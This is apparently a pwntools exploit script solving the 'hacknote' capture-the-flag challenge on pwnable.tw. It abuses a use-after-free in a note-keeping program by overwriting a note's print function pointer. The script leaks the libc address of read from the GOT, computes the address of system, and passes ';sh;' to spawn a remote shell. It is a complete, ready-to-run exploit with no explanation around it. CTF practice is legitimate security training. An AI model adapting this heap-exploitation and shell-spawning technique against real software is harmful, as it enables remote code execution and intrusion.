from pwn import *

PROG = './chal'

db = """set $notes=0x0804a050
b *0x0804891f
c"""

r = remote('chall.pwnable.tw', 10102)
#r = process(PROG)
#r = gdb.debug(PROG, db)

def add(size, content):
    r.sendlineafter(b'Your choice :', b'1')
    r.sendlineafter(b'Note size :', size)
    r.sendafter(b'Content :', content)

def delete(index):
    r.sendlineafter(b'Your choice :', b'2')
    r.sendlineafter(b'Index :', index)

def print_note(index):
    r.sendlineafter(b'Your choice :', b'3')
    r.sendlineafter(b'Index :', index)

add(b'16', b'A' * 16)
add(b'16', b'B' * 16) 
delete(b'0')
delete(b'1')

print_fun = 0x0804862b 
read_got = 0x804a00c
add(b'8', p32(print_fun) + p32(read_got))
print_note(b'0')

libc_read = unpack(r.recv(4), 32, endian='little')
log.info('Leaked read addr: ' + hex(libc_read))

offset = 0xd41c0
libc_base = libc_read - offset
log.info('Leaked libc base: ' + hex(libc_base))

system = libc_base + 0x3a940

delete(b'2')
add(b'8', p32(system) + b';sh;')
print_note(b'0')

r.interactive()
